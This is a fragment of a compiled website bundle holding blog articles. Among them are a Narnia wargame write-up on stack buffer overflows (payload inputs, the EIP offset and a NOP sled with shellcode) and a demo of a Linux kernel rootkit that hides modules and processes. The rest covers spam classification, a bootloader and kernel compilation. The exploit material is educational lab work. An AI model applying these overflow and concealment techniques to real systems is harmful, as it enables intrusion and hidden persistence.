0x%08x\\\\n\\\"</span>,val);\\n \\n    <span class=\\\"hljs-keyword\\\">if</span>(val==<span class=\\\"hljs-number\\\">0xdeadbeef</span>)\\n        system(<span class=\\\"hljs-string\\\">\\\"/bin/sh\\\"</span>);\\n    <span class=\\\"hljs-keyword\\\">else</span> {\\n        <span class=\\\"hljs-built_in\\\">printf</span>(<span class=\\\"hljs-string\\\">\\\"WAY OFF!!!!\\\\n\\\"</span>);\\n        <span class=\\\"hljs-built_in\\\">exit</span>(<span class=\\\"hljs-number\\\">1</span>);\\n    }\\n \\n    <span class=\\\"hljs-keyword\\\">return</span> <span class=\\\"hljs-number\\\">0</span>;\\n}\\n</code></pre>\\n<p>The goal of this level is to change <code>val</code>'s value from <code>0x41414141</code> to <code>0xdeadbeef</code> so the binary will spawn a shell. In the source code, we see that we are only setting <code>buf</code>'s value with the user’s input. So how can we overwrite <code>val</code>? <code>buf</code> is defined as being 20 bytes in length. If we attempt to fill <code>buf</code> with greater than 20 bytes of data we will overflow into a higher memory address, which happens to belong to <code>val</code>. Let’s try it.</p>\\n<pre><code class=\\\"language-sh\\\">narnia0@melinda:/narnia$ python -c <span class=\\\"hljs-string\\\">'print \\\"A\\\"*20 + \\\"B\\\"*4'</span> | ./narnia0 \\nCorrect vals value from 0x41414141 -&gt; 0xdeadbeef!\\nHere is your chance: buf: AAAAAAAAAAAAAAAAAAAABBBB\\nval: 0x42424242\\nWAY OFF!!!!\\n</code></pre>\\n<p>Notice <code>val</code> was overwritten with <code>0x42424242</code>. This is the hexadecimal equivalent of “BBBB”.

Note that the string is <code>\\\\xef\\\\xbe\\\\xad\\\\xde</code> and not <code>\\\\xde\\\\xad\\\\xbe\\\\xef</code>. This is because our computer stores memory in <strong>little-endian</strong> format. So we see <code>val</code> has been overwritten with <code>0xdeadbeef</code>, but where’s our shell?

It takes a single argument, copies the argument’s value into a buffer, and prints the buffer. Using knowledge of stack frames and buffer overflows we should be able to exploit this code to gain root. To complete this level we’ll need to use <strong>GBD</strong> to assist us in debugging the binary. Let’s start by entering GDB and dumping the assembly code to see what we’re working with. Enter <code>gdb narnia2</code> to start the debugger.</p>\\n<p>SIDE NOTE: <a href=\\\"http://darkdust.net/files/GDB%20Cheat%20Sheet.pdf\\\">DarkDust</a> has a great cheat sheet for GDB

Using this knowledge we can calculate the offset between the start of <code>buf</code> and the start of our saved EIP.</p>\\n<pre><code>(gdb) print <span class=\\\"hljs-number\\\">0xffffd6bc</span><span class=\\\"hljs-number\\\">-0xffffd630</span>\\n$<span class=\\\"hljs-number\\\">1</span> = <span class=\\\"hljs-number\\\">140</span>\\n</code></pre>\\n<p>They are 140 bytes apart.

The last four bytes of the string will need to be the return address we want to jump to that will run our shellcode. Speaking of which, we’ll also need some shellcode. For this exercise we’ll reuse the shellcode from the previous level.

It is called a NOP slide because <code>x\\\\90</code> is the NOP, or “No Operation”, instruction which does nothing except advance the EIP register. When we hit anywhere within the slide we will just keep advancing until will reach our shellcode.

Classification just means that something can be placed into a specific group based on its characteristics. In our case we can either classify an email as <strong>spam</strong> or not spam, often called <strong>ham</strong>.</p>\\n<p>So how can a computer decipher whether an email is considered spam or ham? A time-tested method that can be used is a <em>Bayesian filter</em>. I will not go into the mathematics behind a Bayesian filter here but if you are interested in learning more about this, an awesome article over at <a href=\\\"https://betterexplained.com/articles/an-intuitive-and-short-explanation-of-bayes-theorem/\\\">Better Explained</a> provides a very intuitive explanation.</p>\\n<p>We are going to train a classifier that will detect whether an email is spam or ham based on its textual content. Words like <em>viagra</em> and <em>lottery</em> are going to appear more frequently in spam emails than legitimate ones. The classifier will use this knowledge to make its decision when classifying an email.</p>\\n<h3>Let’s Get Started</h3>\\n<h4>Project Structure</h4>\\n<pre><code>.\\n├── data\\n│   ├── enron1\\n│   │   ├── ham\\n│   │   └── spam\\n│   ├── enron2\\n│   │   ├── ham\\n│   │   └── spam\\n│   └── enron3\\n│       ├── ham\\n│       └── spam\\n├── <span class=\\\"hljs-class\\\"><span class=\\\"hljs-keyword\\\">lib</span></span>\\n│   ├── __init__.py\\n│   ├── model.py\\n│   └── shell.py\\n├── main.py\\n└── requirements.txt\\n</code></pre>\\n<p>The data folder contains three different datasets. The spam and ham folders contain a bunch of <code>.txt</code> files that are the emails. <code>lib/model.py</code> is our machine learning classifier and <code>lib/shell.py</code> is a Python shell that we will use to interact with the trained model. <code>main.py</code> kicks off all the fun.</p>\\n<h4>Building the Classifier</h4>\\n<h5>Initialization</h5>\\n<pre><code class=\\\"language-Python\\\">// lib/model.py\\n\\n<span class=\\\"hljs-keyword\\\">from</span> __future__ <span class=\\\"hljs-keyword\\\">import</span> print_function, division\\n<span class=\\\"hljs-keyword\\\">import</span> os\\n<span class=\\\"hljs-keyword\\\">from</span> collections <span class=\\\"hljs-keyword\\\">import</span> Counter\\n<span class=\\\"hljs-keyword\\\">from</span> string <span class=\\\"hljs-keyword\\\">import</span> punctuation\\n<span class=\\\"hljs-keyword\\\">from</span> random <span class=\\\"hljs-keyword\\\">import</span> shuffle, randint\\n<span class=\\\"hljs-keyword\\\">from</span> nltk <span class=\\\"hljs-keyword\\\">import</span> WordNetLemmatizer, word_tokenize\\n<span class=\\\"hljs-keyword\\\">from</span> nltk.corpus <span class=\\\"hljs-keyword\\\">import</span> stopwords\\n<span class=\\\"hljs-keyword\\\">from</span> nltk <span class=\\\"hljs-keyword\\\">import</span> NaiveBayesClassifier, classify\\n\\n<span class=\\\"hljs-class\\\"><span class=\\\"hljs-keyword\\\">class</span> <span class=\\\"hljs-title\\\">Model</span><span class=\\\"hljs-params\\\">(object)</span>:</span>\\n    stoplist = stopwords.words(<span class=\\\"hljs-string\\\">'english'</span>)\\n    \\n    <span class=\\\"hljs-function\\\"><span class=\\\"hljs-keyword\\\">def</span> <span class=\\\"hljs-title\\\">__init__</span><span class=\\\"hljs-params\\\">(self)</span>:</span>\\n        self.trainDir = self.getRandomDir()\\n        strTrainDir = str(self.trainDir)\\n        print(<span class=\\\"hljs-string\\\">'Training with enron'</span> + strTrainDir + <span class=\\\"hljs-string\\\">' dataset.'</span>)\\n        hamPath = <span class=\\\"hljs-string\\\">'data/enron'</span> + strTrainDir + <span class=\\\"hljs-string\\\">'/ham/'</span>\\n        spamPath = <span class=\\\"hljs-string\\\">'data/enron'</span> + strTrainDir + <span class=\\\"hljs-string\\\">'/spam/'</span>\\n        spamFiles = os.listdir(spamPath)\\n        hamFiles = os.listdir(hamPath)\\n        hamCorpus = self.buildCorpus(hamFiles, hamPath)\\n        spamCorpus = self.buildCorpus(spamFiles, spamPath)\\n        self.emails = self.labelEmails(spamCorpus, hamCorpus)\\n        <span class=\\\"hljs-keyword\\\">print</span> (<span class=\\\"hljs-string\\\">'CORPUS SIZE: '</span> + str(len(self.emails)) + <span class=\\\"hljs-string\\\">' emails\\\\n'</span>)\\n        shuffle(self.emails)\\n        \\n<span class=\\\"hljs-meta\\\">    @staticmethod</span>\\n    <span class=\\\"hljs-function\\\"><span class=\\\"hljs-keyword\\\">def</span> <span class=\\\"hljs-title\\\">buildCorpus</span><span class=\\\"hljs-params\\\">(fileList, path)</span>:</span>\\n        corpus = []\\n        <span class=\\\"hljs-keyword\\\">for</span> file <span class=\\\"hljs-keyword\\\">in</span> fileList:\\n            <span class=\\\"hljs-keyword\\\">if</span> <span class=\\\"hljs-keyword\\\">not</span> file.startswith(<span class=\\\"hljs-string\\\">'.'</span>):\\n                f = open(path + file, <span class=\\\"hljs-string\\\">'r'</span>)\\n                corpus.append(f.read())\\n        f.close()\\n        <span class=\\\"hljs-keyword\\\">return</span> corpus\\n\\n<span class=\\\"hljs-meta\\\">    @staticmethod</span>\\n    <span class=\\\"hljs-function\\\"><span class=\\\"hljs-keyword\\\">def</span> <span class=\\\"hljs-title\\\">getRandomDir</span><span class=\\\"hljs-params\\\">()</span>:</span>\\n        numDirs = len([f <span class=\\\"hljs-keyword\\\">for</span> f <span class=\\\"hljs-keyword\\\">in</span> os.listdir(<span class=\\\"hljs-string\\\">'data'</span>) <span class=\\\"hljs-keyword\\\">if</span> <span class=\\\"hljs-keyword\\\">not</span> f.startswith(<span class=\\\"hljs-string\\\">'.'</span>)])\\n        <span class=\\\"hljs-keyword\\\">return</span> randint(<span class=\\\"hljs-number\\\">1</span>, numDirs)\\n\\n<span class=\\\"hljs-meta\\\">    @staticmethod</span>\\n    <span class=\\\"hljs-function\\\"><span class=\\\"hljs-keyword\\\">def</span> <span class=\\\"hljs-title\\\">labelEmails</span><span class=\\\"hljs-params\\\">(spam, ham)</span>:</span>\\n        emails = [(email, <span class=\\\"hljs-string\\\">'ham'</span>) <span class=\\\"hljs-keyword\\\">for</span> email <span class=\\\"hljs-keyword\\\">in</span> ham]\\n        emails.extend([(email, <span class=\\\"hljs-string\\\">'spam'</span>) <span class=\\\"hljs-keyword\\\">for</span> email <span class=\\\"hljs-keyword\\\">in</span> spam])\\n        <span class=\\\"hljs-keyword\\\">return</span> emails\\n</code></pre>\\n<p>First, we need to initialize everything and correctly label the datasets. The first few lines of code will choose a dataset at random and load it into the program. This dataset will be used to train the classifier. The <code>labelEmails</code> function goes through all the emails and creates two arrays. Each array is an array of tuples with each tuple containing an email and its corresponding label.</p>\\n<h5>Preprocessing</h5>\\n<pre><code class=\\\"language-Python\\\">// lib/model.py\\n\\n<span class=\\\"hljs-class\\\"><span class=\\\"hljs-keyword\\\">class</span> <span class=\\\"hljs-title\\\">Model</span><span class=\\\"hljs-params\\\">(object)</span>:</span>\\n    stoplist = stopwords.words(<span class=\\\"hljs-string\\\">'english'</span>)\\n    \\n    // Previous functions removed\\n    // to increase readability\\n    \\n<span class=\\\"hljs-meta\\\">    @staticmethod</span>\\n    <span class=\\\"hljs-function\\\"><span class=\\\"hljs-keyword\\\">def</span> <span class=\\\"hljs-title\\\">preprocess</span><span class=\\\"hljs-params\\\">(email)</span>:</span>\\n        lemmatizer = WordNetLemmatizer()\\n        <span class=\\\"hljs-comment\\\"># Tokenize email</span>\\n        tokens = word_tokenize(unicode(email, errors=<span class=\\\"hljs-string\\\">'ignore'</span>), language=<span class=\\\"hljs-string\\\">'english'</span>)\\n        <span class=\\\"hljs-comment\\\"># Remove punctuation from token list</span>\\n        tokens = [token <span class=\\\"hljs-keyword\\\">for</span> token <span class=\\\"hljs-keyword\\\">in</span> tokens <span class=\\\"hljs-keyword\\\">if</span> token <span class=\\\"hljs-keyword\\\">not</span> <span class=\\\"hljs-keyword\\\">in</span> punctuation]\\n        <span class=\\\"hljs-comment\\\"># Lemmatize the tokens</span>\\n        lemmatized = [lemmatizer.lemmatize(token.lower()) <span class=\\\"hljs-keyword\\\">for</span> token <span class=\\\"hljs-keyword\\\">in</span> tokens]\\n        <span class=\\\"hljs-keyword\\\">return</span> lemmatized\\n\\n    <span class=\\\"hljs-function\\\"><span class=\\\"hljs-keyword\\\">def</span> <span class=\\\"hljs-title\\\">getFeatures</span><span class=\\\"hljs-params\\\">(self, email)</span>:</span>\\n        <span class=\\\"hljs-keyword\\\">return</span> { word: count <span class=\\\"hljs-keyword\\\">for</span> word, count <span class=\\\"hljs-keyword\\\">in</span> Counter(self.preprocess(email)).items() <span class=\\\"hljs-keyword\\\">if</span> <span class=\\\"hljs-keyword\\\">not</span> word <span class=\\\"hljs-keyword\\\">in</span> self.stoplist }\\n</code></pre>\\n<p>So now that we have two arrays of spam and ham we need to extract the significant features from each email. We begin by preprocessing the data. In the <code>preprocess</code> function we take the email and split it into a bunch of <em>tokens</em>.</p>\\n<pre><code class=\\\"language-Python\\\"><span class=\\\"hljs-meta\\\">&gt;&gt;&gt; </span>word_tokenize(unicode(<span class=\\\"hljs-string\\\">\\\"They’ve done studies, you know. 60 percent of the time, it works every time.\\\"</span>, errors=<span class=\\\"hljs-string\\\">'ignore'</span>), language=<span class=\\\"hljs-string\\\">'english'</span>)\\n[<span class=\\\"hljs-string\\\">u'Theyve'</span>, <span class=\\\"hljs-string\\\">u'done'</span>, <span class=\\\"hljs-string\\\">u'studies'</span>, <span class=\\\"hljs-string\\\">u','</span>, <span class=\\\"hljs-string\\\">u'you'</span>, <span class=\\\"hljs-string\\\">u'know'</span>, <span class=\\\"hljs-string\\\">u'.'</span>, <span class=\\\"hljs-string\\\">u'60'</span>, <span class=\\\"hljs-string\\\">u'percent'</span>, <span class=\\\"hljs-string\\\">u'of'</span>, <span class=\\\"hljs-string\\\">u'the'</span>, <span class=\\\"hljs-string\\\">u'time'</span>, <span class=\\\"hljs-string\\\">u','</span>, <span class=\\\"hljs-string\\\">u'it'</span>, <span class=\\\"hljs-string\\\">u'works'</span>, <span class=\\\"hljs-string\\\">u'every'</span>, <span class=\\\"hljs-string\\\">u'time'</span>, <span class=\\\"hljs-string\\\">u'.'</span>]\\n</code></pre>\\n<p>Next, we strip the tokenized array of all punctuation and lemmatize the tokens. Lemmatizing returns the base for a given word. I.E. “footballs” becomes “football” and “walking” becomes “walk”. Using the base of each word helps the classifier correctly classify an email.</p>\\n<p>The <code>getFeatures</code> function takes the preprocessed email and counts the frequency of each word. Note that if the word is in the <em>stoplist</em> it is not counted. Stopwords are words that have no contextual significance. These are words like “a”, “the”, and “because”.</p>\\n<h4>Training the Classifier</h4>\\n<pre><code class=\\\"language-Python\\\">// lib/model.py\\n\\n<span class=\\\"hljs-class\\\"><span class=\\\"hljs-keyword\\\">class</span> <span class=\\\"hljs-title\\\">Model</span><span class=\\\"hljs-params\\\">(object)</span>:</span>\\n    stoplist = stopwords.words(<span class=\\\"hljs-string\\\">'english'</span>)\\n    \\n    // Previous functions removed\\n    // to increase readability\\n    \\n    <span class=\\\"hljs-function\\\"><span class=\\\"hljs-keyword\\\">def</span> <span class=\\\"hljs-title\\\">train</span><span class=\\\"hljs-params\\\">(self, proportion=<span class=\\\"hljs-number\\\">0.8</span>)</span>:</span>\\n        print(<span class=\\\"hljs-string\\\">'Generating feature sets...'</span>)\\n        features = [(self.getFeatures(email), label) <span class=\\\"hljs-keyword\\\">for</span> (email, label) <span class=\\\"hljs-keyword\\\">in</span> self.emails]\\n        trainSize = int(len(features) * proportion)\\n        <span class=\\\"hljs-comment\\\"># Training set is first 80% of features</span>\\n        self.trainSet, self.testSet = features[:trainSize], features[trainSize:]\\n        <span class=\\\"hljs-comment\\\"># Train the classifier</span>\\n        print(<span class=\\\"hljs-string\\\">'Training predictive model...'</span>)\\n        self.classifier = NaiveBayesClassifier.train(self.trainSet)\\n        \\n    <span class=\\\"hljs-function\\\"><span class=\\\"hljs-keyword\\\">def</span> <span class=\\\"hljs-title\\\">evaluate</span><span class=\\\"hljs-params\\\">(self)</span>:</span>\\n        <span class=\\\"hljs-comment\\\"># Check how the classifier performs the test set</span>\\n        print(<span class=\\\"hljs-string\\\">'\\\\n----------------- RESULTS -----------------'</span>)\\n        <span class=\\\"hljs-keyword\\\">print</span> (<span class=\\\"hljs-string\\\">'TEST SET ACCURACY:     '</span> + <span class=\\\"hljs-string\\\">'{0:.1%}'</span>.format(classify.accuracy(self.classifier, self.testSet)) + <span class=\\\"hljs-string\\\">'\\\\n'</span>)\\n\\n        self.classifier.show_most_informative_features(<span class=\\\"hljs-number\\\">20</span>)\\n        print(<span class=\\\"hljs-string\\\">'\\\\n----------------- END RESULTS -------------'</span>)\\n</code></pre>\\n<p>In the <code>train</code> function we use the <code>getFeatures</code> function we just built. After we have the array of featurized (this is probably not a word) emails and their corresponding labels, we split up the feature set into a training set and a validation set. The general rule of thumb is to use 80% of the set for training and the remaining 20% for validation. The training set is then fed into the classifier. The classifier uses Bayesian filtering on the training set to generate a model which is then returned to us.</p>\\n<p><code>evaluate</code> just prints out the accuracy of the model by running it against the validation set we portioned off earlier. We will use this in the next section.</p>\\n<h4>Building an Interactive Shell</h4>\\n<pre><code class=\\\"language-Python\\\">// lib/shell.py\\n\\n<span class=\\\"hljs-keyword\\\">from</span> __future__ <span class=\\\"hljs-keyword\\\">import</span> print_function\\n<span class=\\\"hljs-keyword\\\">from</span> random <span class=\\\"hljs-keyword\\\">import</span> choice\\n<span class=\\\"hljs-keyword\\\">from</span> cmd <span class=\\\"hljs-keyword\\\">import</span> Cmd\\n<span class=\\\"hljs-keyword\\\">import</span> os\\n\\n<span class=\\\"hljs-class\\\"><span class=\\\"hljs-keyword\\\">class</span> <span class=\\\"hljs-title\\\">Shell</span><span class=\\\"hljs-params\\\">(Cmd)</span>:</span>\\n\\n    prompt = <span class=\\\"hljs-string\\\">'&gt;

In order to learn more about this I have built an <em>extremely</em> simple bootloader using assembly language.</p>\\n<h3>What Is a Bootloader?</h3>\\n<p>When you turn on your computer, the <strong>BIOS</strong> (Basic Input Output System) runs a <strong>POST</strong> (Power On Self Test) test to ensure your machine has ample power, memory, and devices installed. If this test passes, the BIOS then loads a bootloader which is responsible for loading the kernel.</p>\\n<p>When the bootloader program is ran it is executed under 16-bit Real Mode. Real Mode means that you have unlimited direct access to all addressable memory. Also, virtual memory and memory protection do not exist at this point.</p>\\n<p>In this example we will not be loading a kernel, but instead display a simple “Hello, World!” on an x86 emulator. However, the concepts learned here are the basis for building a real bootloader.</p>\\n<h3>The Nitty-Gritty</h3>\\n<p>Here is the full program.

All x86 compatible computers boot into 16 bit mode. The second line tells the compiler to ensure all address are relative to <code>0x7c00</code>.

This is necessary for bootloaders that run on x86 machines. Next, we move the address of the first character in <code>msg</code> into the <code>si</code> register. This sets us up to be able to run our print function to print <code>msg</code>. After the address has been loaded into <code>si</code> we call the print function. Let’s see what <code>print</code> looks like.</p>\\n<pre><code><span class=\\\"hljs-symbol\\\">print:</span>\\n        <span class=\\\"hljs-keyword\\\">lodsb</span>                            <span class=\\\"hljs-comment\\\">; Transfers byte @ DS:SI into AL &amp;&amp; SI++</span>\\n        <span class=\\\"hljs-keyword\\\">or</span>          <span class=\\\"hljs-built_in\\\">al</span>, <span class=\\\"hljs-built_in\\\">al</span>\\n        <span class=\\\"hljs-keyword\\\">jz</span>          return\\n        <span class=\\\"hljs-keyword\\\">mov</span>         <span class=\\\"hljs-number\\\">ah</span>, <span class=\\\"hljs-number\\\">0x0e</span>             <span class=\\\"hljs-comment\\\">; Load \\\"Teletype Output\\\"</span>\\n        <span class=\\\"hljs-keyword\\\">int</span>         <span class=\\\"hljs-number\\\">0x10</span>                 <span class=\\\"hljs-comment\\\">; Print character to screen</span>\\n        <span class=\\\"hljs-keyword\\\">jmp</span>         print\\n</code></pre>\\n<p><code>lodsb</code> loads what is pointed to by <code>si</code> into the <code>al</code> register and increments <code>si</code> by one. We then check if we’ve reached the end of the null terminated string with <code>or al, al</code>. If we have we return out of the function, if not we keep going. Now we set up to print the first character to the screen. We are going to use the <code>0x10</code> interrupt to print but first we must load <code>0x0e</code> into <code>ah</code>. <code>0x0e</code> is the number of the <em>Teletype Output</em> operation in the <code>0x10</code> interrupt vector. Finally, we call the interrupt and then loop to the top of <code>print</code> again and repeat until we’ve reached the end of the string.</p>\\n<pre><code><span class=\\\"hljs-symbol\\\">main:</span>\\n        <span class=\\\"hljs-keyword\\\">cli</span>                              <span class=\\\"hljs-comment\\\">; Disable hardware interrupts</span>\\n        <span class=\\\"hljs-keyword\\\">mov</span>         <span class=\\\"hljs-built_in\\\">si</span>, msg\\n        <span class=\\\"hljs-keyword\\\">call</span>        print\\n--&gt;     <span class=\\\"hljs-keyword\\\">hlt</span>\\n</code></pre>\\n<p>After returning out the print operation we halt the program because we are finished.</p>\\n<pre><code><span class=\\\"hljs-built_in\\\">times</span> <span class=\\\"hljs-number\\\">510</span> - ($-$$) <span class=\\\"hljs-built_in\\\">db</span> <span class=\\\"hljs-number\\\">0</span>\\n<span class=\\\"hljs-built_in\\\">dw</span> <span class=\\\"hljs-number\\\">0xAA55</span>  \\n</code></pre>\\n<p>In order for a bootloader to be valid it needs to be <strong>exactly</strong> 512 bytes. The first line ensures that we fill whatever space we didn’t use up to 512 with 0’s. <code>dw 0xAA55</code> is the <em>Boot Signature</em>. The BIOS looks for this value when determining for a bootable disk. This declares the disk the bootloader is stored on as bootable.</p>\\n<h3>Running the Bootloader</h3>\\n<p>We will be using an x86 emulator called <a href=\\\"http://wiki.qemu.org/\\\">QEMU</a> to test our bootloader.</p>\\n<p>First, we must compile the assembly program into a binary. We will be using NASM for this.</p>\\n<pre><code class=\\\"language-sh\\\">nasm <span class=\\\"hljs-_\\\">-f</span> bin tinyboot.asm -o tinyboot.bin\\n</code></pre>\\n<p>Once we have the binary we will be using <code>dd</code> to convert the binary into a floppy image we can boot from.</p>\\n<pre><code class=\\\"language-sh\\\">dd conv=notrunc <span class=\\\"hljs-keyword\\\">if</span>=tinyboot.bin of=floppy.flp\\n</code></pre>\\n<p>Almost there! We just need to launch QEMU with our new floppy image to see the magic happen.</p>\\n<pre><code class=\\\"language-sh\\\">qemu-system-i386 -fda floppy.flp\\n</code></pre>\\n<figure>\\n    <br/>\\n\\t<img style=\\\"\\\" src=\\\"./qemu.png\\\" alt=\\\"Bootloader\\\">\\n\\t<figcaption>Sample bootloader running on QEMU</figcaption>\\n</figure>\\n<p>So there you have it…our beautiful bootloader in all its glory!</p>\\n<h3>Final Thoughts</h3>\\n<p>This was a fun exercise but writing a custom bootloader is not very practical. If you were to develop an OS it is best to use a pre-existing bootloader like <a href=\\\"https://www.gnu.org/software/grub/\\\">GRUB</a>.

Typically you will never need to compile your own kernel but it’s interesting to know how it’s done regardless. As a quick note, the Linux kernel we are going to be building today is different than the kernel you get from your distribution (Ubuntu, Debian, etc). This is the raw kernel that comes from Linux Torvalds himself. Linux kernels shipped from distributions are modified versions of the mainline kernel that include patches and customizations from the distributor.</p>\\n<p>I will be building the latest stable kernel (4.10.2 at the time of this writing) on Ubuntu 14.04 so these steps may not be exactly correct for you. However, the general process is the same.</p>\\n<h3>Prerequisites</h3>\\n<p>In order to compile the kernel we will need some tools. Let’s get those.</p>\\n<pre><code class=\\\"language-bash\\\">sudo apt-get install build-essential ncurses-dev libssl-dev wget\\n</code></pre>\\n<p>We’ll also need to get the kernel source and create a working directory.</p>\\n<pre><code class=\\\"language-bash\\\">mkdir linux &amp;&amp; <span class=\\\"hljs-built_in\\\">cd</span> linux\\nwget https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.10.2.tar.xz\\n\\n</code></pre>\\n<h3>Let’s Get Started</h3>\\n<p>First, we’ll need to extract the kernel from the tarball. Once it is extracted we can delete the tarball as it is no longer needed.</p>\\n<pre><code class=\\\"language-bash\\\">tar xf linux-4.10.2.tar.xz\\nrm <span class=\\\"hljs-_\\\">-f</span> linux-4.10.2.tar.xz\\n</code></pre>\\n<p>Now <code>cd</code> into the extracted kernel directory.</p>\\n<h3>Kernel Configuration</h3>\\n<p>The Linux kernel requires a <code>.config</code> file for building. We will need to create this. You can manually create the config by going through each of the thousands of options one-by-one but that is not recommended. Instead we are going to use the config for our host OS as a baseline.</p>\\n<pre><code class=\\\"language-bash\\\">cp /boot/config-$(uname -r) .config\\nyes <span class=\\\"hljs-string\\\">\\\"\\\"</span> | make oldconfig\\n</code></pre>\\n<p>The above copies the host OS config into the config used for the kernel we are building. We then answer “yes” to any new configuration options in the vanilla kernel.</p>\\n<h3>Compiling</h3>\\n<p>We are now ready to compile the kernel. This is going to take some time so go grab some coffee. When compiling the kernel we have the option to specify how many cores we should use when compiling. Check how many cores you have available with the <code>nproc</code> command. I have 8 so I am going to use 6 of those for the compiling task.</p>\\n<pre><code class=\\\"language-bash\\\">make -j6\\n</code></pre>\\n<p>Hopefully your kernel compiled successfully. If it did you can move onto the next step. We now have to compile and install the kernel modules.</p>\\n<pre><code class=\\\"language-bash\\\">sudo make modules_install install\\n</code></pre>\\n<p>Congratulations! If you’ve made it this far you’ve successfully compiled a vanilla Linux kernel that is ready for use. From here you can update grub to boot into your new kernel. However, I will be booting the kernel using the qemu emulator. I plan on writing a follow-up tutorial for this in the near future.</p>\\n\"}\n\n\n//////////////////\n// WEBPACK FOOTER\n// ./articles/2017-03-14-compiling-linux-kernel/index.md\n// module id = 505\n// module chunks = 0","module.exports = {\"title\":\"Subverting the Linux Kernel for Fun and Profit\",\"date\":\"2017-04-22T23:51:47+00:00\",\"layout\":\"post\",\"path\":\"/rootkit-poc/\",\"category\":\"security\",\"description\":\"Demonstration of a simple rootkit developed for the 2.6.x Linux kernel.\",\"body\":\"<p>I’ve built a simple rootkit for the 2.6.x Linux kernel that has the ability to hide itself as well as hide processes. It’s fairly simple feature-wise but gave me a more insight into how rootkits work and allowed me to get my hands dirty in Linux kernel module development.</p>\\n<p>I’m not going to go into the specifics of how the code works, rather I’m just going to give a quick demo of the rootkit in action.</p>\\n<h3>What Is a Rootkit?</h3>\\n<p>First let’s explain what a rootkit is and how it relates to security. According to <a href=\\\"https://www.veracode.com/security/rootkit\\\">Veracode</a>:</p>\\n<blockquote>\\n<p>A rootkit is a clandestine computer program designed to provide continued privileged access to a computer while actively hiding its presence. The term rootkit is a connection of the two words “root” and “kit.” Originally, a rootkit was a collection of tools that enabled administrator-level access to a computer or network. Root refers to the Admin account on Unix and Linux systems, and kit refers to the software components that implement the tool. Today rootkits are generally associated with malware – such as Trojans, worms, viruses – that conceal their existence and actions from users and other system processes.</p>\\n</blockquote>\\n<p>So originally rootkits were used to provide remote administrator-level access to systems for legitimate uses. Schools and businesses were typical users of these rootkits. However, over time rootkits found their home in malware. A rootkit installed on a victim’s machine can conceal itself and allow remote access to the machine via a backdoor.</p>\\n<h3>Avoiding Detection</h3>\\n<p>To avoid detection, a rootkit must able to hide itself from the typical places you would be able to list installed kernel modules. This includes <code>/proc/modules</code> and <code>/sys/module</code>. As you can see in the figure below, the rootkit is not able to be found through <code>lsmod</code> after giving it the <code>modhide</code> command. All commands are issued to the rootkit through a character device.</p>\\n<figure>\\n    <br/>\\n\\t<img style=\\\"\\\" src=\\\"./modhide.gif\\\" alt=\\\"modhide cmd\\\">\\n\\t<figcaption>modehide command</figcaption>\\n</figure>\\n<p>To be able to uninstall the rootkit we must first reveal it by sending it the <code>modshow</code> command. Now we can safely use <code>rmmod</code> to remove it.</p>\\n<h3>Hiding Processes</h3>\\n<p>The rootkit also has the ability to hide currently running processes. This can be achieved by issuing the <code>phide</code> command with a PID as an argument. Let’s see this in action.</p>\\n<figure>\\n    <br/>\\n\\t<img style=\\\"\\\" src=\\\"./phide.gif\\\" alt=\\\"phide cmd\\\">\\n\\t<figcaption>phide command</figcaption>\\n</figure>\\n<p>Just like with <code>modhide</code>, we have a corresponding <code>pshow</code> command to reveal the process.</p>\\n<h3>Final Thoughts</h3>\\n<p>There are many features that a typical rootkit would include that are not included in this implementation. This is by no means complete and is just a simple example implementation.</p>\\n<p>Source code available on <a href=\\\"https://github.com/triedal/rootkit\\\">GitHub</a>.</p>\\n\"}\n\n\n//////////////////\n// WEBPACK FOOTER\n// ./articles/2017-04-22-rootkit/index.md\n// module id = 506\n// module chunks = 0","import React from 'react'\nimport { Link } from 'react-router'\nimport sortBy from 'lodash/sortBy'\nimport moment from 'moment'\nimport Helmet from 'react-helmet'\nimport { prefixLink } from 'gatsby-helpers'\nimport access from 'safe-access'\nimport { config } from 'config'\nimport SitePost from '../components/SitePost'\nimport SiteSidebar from '../components/SiteSidebar'\n\nclass SiteIndex extends React.Component {\n  render () {\n    const pageLinks = []\n    // Sort pages.\n    console.log(this.props)\n    const sortedPages = sortBy(this.props.route.pages, (page) => access(page, 'data.date')\n    ).reverse()\n    sortedPages.forEach((page) => {\n      if (access(page, 'file.ext') === 'md' && access(page, 'data.layout') === 'post') {\n        const title = access(page, 'data.title') || page.path\n        const description = access(page, 'data.description')\n        const datePublished = access(page, 'data.date')\n        const category = access(page, 'data.category')\n\n        pageLinks.push(\n          <div className=\"blog-post\">\n            <time dateTime={moment(datePublished).format('MMMM D, YYYY')}>\n              {moment(datePublished).format('MMMM YYYY')}\n            </time>\n            <span style={{ padding: '5px' }} />\n            <span className=\"blog-category\">{category}</span>\n            <h2><Link style={{ borderBottom: 'none' }} to={prefixLink(page.path)} > {title} </Link></h2>\n            <p dangerouslySetInnerHTML={{ __html: description }} />\n            <Link className=\"readmore\" to={prefixLink(page.path)}> Read\n                      </Link>\n          </div>\n        )\n      }\n    })\n\n    return (\n      <div>\n        <Helmet title={config.siteTitle} />\n        <SiteSidebar {...this.props} />\n        <div className=\"content\">\n          <div className=\"main\">\n            <div className=\"main-inner\">\n              {pageLinks}\n            </div>\n          </div>\n        </div>\n      </div>\n    )\n  }\n}\n\nSiteIndex.propTypes = {\n  route: React.PropTypes.object,\n}\n\nexport default SiteIndex\n\n\n\n// WEBPACK FOOTER //\n// ./index.jsx","module.exports = {\"title\":\"About me\",\"layout\":\"page\",\"path\":\"/about\",\"body\":\"<p>I am a full-stack developer with interests in business, real estate, and technology.

Through his pursuit of a comedy career Jimmy was able to meet many of his childhood heroes and become an actor in top TV shows and movies such as <em>Silicon Valley</em> and <em>Patriot's Day</em>.</p>\\n</div>\\n<div class=\\\"book\\\">\\n  <img class=\\\"thumb\\\" src=\\\"./rework.jpg\\\">\\n  <h3>Rework</h3>\\n  <em>By Jason Fried &amp; David Heinemeier Hansson</em>\\n  <p><em>Rework</em> challenges conventional business wisdom. You don't need a business plan, you don't need funding, and you don't need a large team. One of my favorite pieces of advice in this book is \\\"Good enough is fine\\\". When facing an obstacle, look for a solution that delivers maximum efficiency with minimum effort. As an engineer, I think we have the tendency to create over optimized solutions to problems because it's sexy. However, these solutions do not necessarily contribute more added value to the bottom line and are just wasted time and effort. <em>Rework</em> also refutes the idea of workaholism. Workaholics don't accomplish more than nonworkaholics. Come up with an effienct solution rather than brute forcing more hours into it. This book goes hand-in-hand with <em>The Lean Startup</em>.</p>\\n</div>\\n\"}\n\n\n//////////////////\n// WEBPACK FOOTER\n// 